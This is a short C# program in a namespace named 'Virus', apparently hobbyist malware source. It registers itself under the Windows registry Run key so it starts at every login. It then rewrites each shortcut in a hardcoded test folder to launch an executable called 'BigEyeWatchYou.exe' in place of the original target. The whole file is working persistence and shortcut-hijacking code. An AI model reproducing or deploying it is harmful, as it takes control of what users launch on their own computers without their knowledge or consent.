using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using LnkChanger;

using System.Runtime.InteropServices;

namespace Virus
{
    class Program
    {

        [STAThread]
        static void Main(string[] args)
        {
            SetStartup();
            var folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var testFolfer = @"C:\Users\New\Desktop\Test";
            var files = LnkHelper.GetAllShortcutsFiles(testFolfer);
            var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");

            int count = 0;

            foreach(var file in files)
            {
                var path = LnkHelper.GetShellLinkPath(file.FullName);
                if (!path.Contains("BigEyeWatchYou.exe"))
                {
                    LnkHelper.ChangeShortcut(file.FullName, targetPath, QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                }
            }
        }


        private static string QuotedMarked(string value)
        {
            return $"\"{value}\"";
        }

        private static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string appFullPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appName = Path.GetFileNameWithoutExtension(appFullPath);

            if (rk.GetValue(appName) == null)
            {
                rk.SetValue(appName, appFullPath);
            }



        }
    }
}
